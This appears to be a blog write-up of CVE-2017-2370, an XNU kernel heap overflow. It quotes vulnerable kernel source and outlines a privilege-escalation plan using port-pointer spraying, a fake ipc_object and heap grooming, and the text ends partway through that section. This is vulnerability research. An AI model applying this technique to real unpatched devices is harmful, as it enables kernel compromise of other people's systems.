<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="CVE-2017-2370 Bug 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364kern_return_t  mach_voucher_extract_attr_recipe_trap(struct mac">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2017-2370">
<meta property="og:url" content="https://kpwnz.github.io/2021/11/03/CVE-2017-2370/index.html">
<meta property="og:site_name">
<meta property="og:description" content="CVE-2017-2370 Bug 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364kern_return_t  mach_voucher_extract_attr_recipe_trap(struct mac">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-11-04T00:54:55.000Z">
<meta property="article:modified_time" content="2021-11-22T16:22:16.199Z">
<meta property="article:author" content="Xia0o0o0o">
<meta property="article:tag" content="Vulnerability">
<meta property="article:tag" content="XNU">
<meta property="article:tag" content="macOS">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
      
        
          <link rel="icon" type="image/png" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
    
    <!-- title -->
    <title>CVE-2017-2370</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="../../../../css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="atom.xml" title="" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
      <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Home
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../index.html">
                Home
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Writing
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>
              <a style="padding-left: 9px;" href="../../../../archives/">
                Writing
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Projects
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../https:/github.com/KpwnZ">
                Projects
              </a>
          </span>
        </li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="../../22/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021-PWN/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="../Hackergame2021-Writeup/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&text=CVE-2017-2370"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&title=CVE-2017-2370"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&is_video=false&description=CVE-2017-2370"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2017-2370&body=Check out this article: https://kpwnz.github.io/2021/11/03/CVE-2017-2370/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&title=CVE-2017-2370"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&title=CVE-2017-2370"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&title=CVE-2017-2370"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&title=CVE-2017-2370"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&name=CVE-2017-2370&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&t=CVE-2017-2370"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">CVE-2017-2370</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bug"><span class="toc-number">1.1.</span> <span class="toc-text">Bug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Heap-Fengshui"><span class="toc-number">1.2.1.</span> <span class="toc-text">Heap Fengshui</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overflow"><span class="toc-number">1.2.2.</span> <span class="toc-text">Overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-escalation"><span class="toc-number">1.2.3.</span> <span class="toc-text">Privilege escalation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KASLR"><span class="toc-number">1.2.4.</span> <span class="toc-text">KASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Read-arbitrary-kernel-memory"><span class="toc-number">1.2.5.</span> <span class="toc-text">Read arbitrary kernel memory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-kernel-memory-writing"><span class="toc-number">1.2.6.</span> <span class="toc-text">Arbitrary kernel memory writing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time-to-get-root"><span class="toc-number">1.2.7.</span> <span class="toc-text">Time to get root!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Some-sturcture-we-use%E2%80%A6"><span class="toc-number">1.2.8.</span> <span class="toc-text">Some sturcture we use…</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CVE-2017-2370
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Xia0o0o0o</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-11-04T00:54:55.000Z" class="dt-published" itemprop="datePublished">2021-11-03</time>
        
      
    </div>


      

      
    <div class="article-tag" style="text-decoration: none;">
        <i class="fa-solid fa-tag"></i>
        <a class="tag-category" href="../../../../tags/Vulnerability/" rel="tag">Vulnerability</a> <a class="tag-category" href="../../../../tags/XNU/" rel="tag">XNU</a> <a class="tag-category" href="../../../../tags/macOS/" rel="tag">macOS</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1>CVE-2017-2370</h1>
<h2 id="Bug">Bug</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span></span></span><br><span class="line"><span class="function">  <span class="title">mach_voucher_extract_attr_recipe_trap</span><span class="params">(struct mach_voucher_extract_attr_recipe_args *args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">ipc_voucher_t</span> voucher = IV_NULL;</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr = KERN_SUCCESS;</span><br><span class="line">    <span class="keyword">mach_msg_type_number_t</span> sz = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// recipe_size is a pointer</span></span><br><span class="line">    <span class="keyword">if</span> (copyin(args-&gt;recipe_size, (<span class="keyword">void</span> *)&amp;sz, <span class="keyword">sizeof</span>(sz)))     </span><br><span class="line">      <span class="keyword">return</span> KERN_MEMORY_ERROR;</span><br><span class="line">    <span class="comment">// now the value of sz is *(args-&gt;recipe_size)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sz &gt; MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE)</span><br><span class="line">      <span class="keyword">return</span> MIG_ARRAY_TOO_LARGE;</span><br><span class="line"></span><br><span class="line">    voucher = convert_port_name_to_voucher(args-&gt;voucher_name);</span><br><span class="line">    <span class="keyword">if</span> (voucher == IV_NULL)</span><br><span class="line">      <span class="keyword">return</span> MACH_SEND_INVALID_DEST;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">mach_msg_type_number_t</span> __assert_only max_sz = sz;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sz &lt; MACH_VOUCHER_TRAP_STACK_LIMIT) &#123;</span><br><span class="line">      <span class="comment">/* keep small recipes on the stack for speed */</span></span><br><span class="line">      <span class="keyword">uint8_t</span> krecipe[sz];</span><br><span class="line">      <span class="keyword">if</span> (copyin(args-&gt;recipe, (<span class="keyword">void</span> *)krecipe, sz)) &#123;</span><br><span class="line">        kr = KERN_MEMORY_ERROR;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">      &#125;</span><br><span class="line">      kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</span><br><span class="line">                                            (<span class="keyword">mach_voucher_attr_raw_recipe_t</span>)krecipe, &amp;sz);</span><br><span class="line">      assert(sz &lt;= max_sz);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (kr == KERN_SUCCESS &amp;&amp; sz &gt; <span class="number">0</span>)</span><br><span class="line">        kr = copyout(krecipe, (<span class="keyword">void</span> *)args-&gt;recipe, sz);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// krecipe is a pointer</span></span><br><span class="line">      <span class="keyword">uint8_t</span> *krecipe = kalloc((<span class="keyword">vm_size_t</span>)sz);</span><br><span class="line">      <span class="keyword">if</span> (!krecipe) &#123;</span><br><span class="line">        kr = KERN_RESOURCE_SHORTAGE;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// args-&gt;recipe_size is a pointer! A pointer is passed a length here, which cause a heap overflow.</span></span><br><span class="line">      <span class="keyword">if</span> (copyin(args-&gt;recipe, (<span class="keyword">void</span> *)krecipe, args-&gt;recipe_size)) &#123;</span><br><span class="line">        kfree(krecipe, (<span class="keyword">vm_size_t</span>)sz);</span><br><span class="line">        kr = KERN_MEMORY_ERROR;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</span><br><span class="line">                                            (<span class="keyword">mach_voucher_attr_raw_recipe_t</span>)krecipe, &amp;sz);</span><br><span class="line">      assert(sz &lt;= max_sz);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (kr == KERN_SUCCESS &amp;&amp; sz &gt; <span class="number">0</span>)</span><br><span class="line">        kr = copyout(krecipe, (<span class="keyword">void</span> *)args-&gt;recipe, sz);</span><br><span class="line">      kfree(krecipe, (<span class="keyword">vm_size_t</span>)sz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kr = copyout(&amp;sz, args-&gt;recipe_size, <span class="keyword">sizeof</span>(sz));</span><br><span class="line"></span><br><span class="line">  done:</span><br><span class="line">    ipc_voucher_release(voucher);</span><br><span class="line">    <span class="keyword">return</span> kr;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>Luckily, args-&gt;recipe can be controlled in user mode, and <code>copyout</code> will stop when it meets an unmap memory. So we can also control the overflow length by umapping the memory.</p>
<h2 id="Exploit">Exploit</h2>
<p>When we send OOL ports</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">mach_msg_return_t</span></span></span><br><span class="line"><span class="function"><span class="title">ipc_kmsg_copyin_body</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">ipc_kmsg_t</span>	kmsg,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">ipc_space_t</span>	space,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">vm_map_t</span>	<span class="built_in">map</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">                <span class="keyword">case</span> MACH_MSG_OOL_PORTS_DESCRIPTOR: </span><br><span class="line">                user_addr = ipc_kmsg_copyin_ool_ports_descriptor((<span class="keyword">mach_msg_ool_ports_descriptor_t</span> *)kern_addr, </span><br><span class="line">                        user_addr, is_task_64bit, <span class="built_in">map</span>, space, dest, kmsg, &amp;mr);</span><br><span class="line">                kern_addr++;</span><br><span class="line">                <span class="built_in">complex</span> = TRUE;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><figcaption><span>will call ```ipc_kmsg_copyin_ool_ports_descriptor``` to read ool ports and allocate memory for it</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```c</span><br><span class="line">mach_msg_descriptor_t *</span><br><span class="line">ipc_kmsg_copyin_ool_ports_descriptor(</span><br><span class="line">        mach_msg_ool_ports_descriptor_t *dsc,</span><br><span class="line">        mach_msg_descriptor_t *user_dsc,</span><br><span class="line">        int is_64bit,</span><br><span class="line">        vm_map_t map,</span><br><span class="line">        ipc_space_t space,</span><br><span class="line">        ipc_object_t dest,</span><br><span class="line">        ipc_kmsg_t kmsg,</span><br><span class="line">        mach_msg_return_t *mr)</span><br><span class="line">&#123;</span><br><span class="line">    // ...</span><br><span class="line"></span><br><span class="line">    ports_length = count * sizeof(mach_port_t);</span><br><span class="line">    names_length = count * sizeof(mach_port_name_t);</span><br><span class="line"></span><br><span class="line">    if (ports_length == 0) &#123;</span><br><span class="line">        return user_dsc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = kalloc(ports_length);</span><br><span class="line">    // ...</span><br><span class="line"></span><br><span class="line">    objects = (ipc_object_t *) data;</span><br><span class="line">    dsc-&gt;address = data;</span><br><span class="line"></span><br><span class="line">    for ( i = 0; i &lt; count; i++) &#123;</span><br><span class="line">        mach_port_name_t name = names[i];</span><br><span class="line">        ipc_object_t object;</span><br><span class="line"></span><br><span class="line">        if (!MACH_PORT_VALID(name)) &#123;</span><br><span class="line">            objects[i] = (ipc_object_t)CAST_MACH_NAME_TO_PORT(name);</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It will be cast to <code>ipc_object_t</code>, a pointer to <code>ipc_object</code>. So we can try to send many <code>MACH_PORT_DEAD</code> to kalloc.256 and overwrite them later and make it point to a fake <code>ipc_object</code> in user space.</p>
<p>After copyout, the memory will be free.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">mach_msg_descriptor_t</span> *</span></span><br><span class="line"><span class="function"><span class="title">ipc_kmsg_copyout_ool_ports_descriptor</span><span class="params">(<span class="keyword">mach_msg_ool_ports_descriptor_t</span> *dsc,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">mach_msg_descriptor_t</span> *user_dsc,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">int</span> is_64bit,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">vm_map_t</span> <span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">ipc_space_t</span> space,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">ipc_kmsg_t</span> kmsg,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">mach_msg_return_t</span> *mr)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">          <span class="keyword">if</span> (rcv_addr != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">mach_port_t</span> *objects = (<span class="keyword">mach_port_t</span> *) dsc-&gt;address;</span><br><span class="line">            <span class="keyword">mach_port_name_t</span> *names = (<span class="keyword">mach_port_name_t</span> *) dsc-&gt;address;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* copyout port rights carried in the message */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; count ; i++) &#123;</span><br><span class="line">                <span class="keyword">ipc_object_t</span> object = (<span class="keyword">ipc_object_t</span>)objects[i];</span><br><span class="line"></span><br><span class="line">                *mr |= ipc_kmsg_copyout_object(space, object,</span><br><span class="line">                        disp, &amp;names[i]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* copyout to memory allocated above */</span></span><br><span class="line">            <span class="keyword">void</span> *data = dsc-&gt;address;</span><br><span class="line">            <span class="keyword">if</span> (copyoutmap(<span class="built_in">map</span>, data, rcv_addr, names_length) != KERN_SUCCESS)</span><br><span class="line">                *mr |= MACH_MSG_VM_SPACE;</span><br><span class="line">            kfree(data, ports_length);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Heap-Fengshui">Heap Fengshui</h3>
<p>Since iOS 9, Apple added <code>random_free_to_zone()</code> when calling <code>zcram</code> which will randomly insert element to the beginning or ending of <code>free_elements</code>. It will be called when try to expand the zone when zone is empty.  So we need some trick to control the memory layout of kernel zone.</p>
<p><code>zalloc</code> will call <code>try_alloc_from_zone</code>(called by <code>zalloc_internal</code> actually). It will return the first element in the <code>free_list</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// osfmk/kern/zalloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">vm_offset_t</span></span></span><br><span class="line"><span class="function"><span class="title">try_alloc_from_zone</span><span class="params">(<span class="keyword">zone_t</span> zone,</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="keyword">boolean_t</span>* check_poison)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  element = (<span class="keyword">vm_offset_t</span>)page_metadata_get_freelist(page_meta);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">vm_offset_t</span> *primary = (<span class="keyword">vm_offset_t</span> *) element;</span><br><span class="line">	<span class="keyword">vm_offset_t</span> *backup  = get_backup_ptr(zone-&gt;elem_size, primary);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Since the primary next pointer is xor&#x27;ed with zp_nopoison_cookie</span></span><br><span class="line"><span class="comment">	 * for obfuscation, retrieve the original value back</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">vm_offset_t</span>  next_element          = *primary ^ zp_nopoison_cookie;</span><br><span class="line">	<span class="keyword">vm_offset_t</span>  next_element_primary  = *primary;</span><br><span class="line">	<span class="keyword">vm_offset_t</span>  next_element_backup   = *backup;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>And <code>free_to_zone</code> will add free element to the front of <code>free_list</code></p>
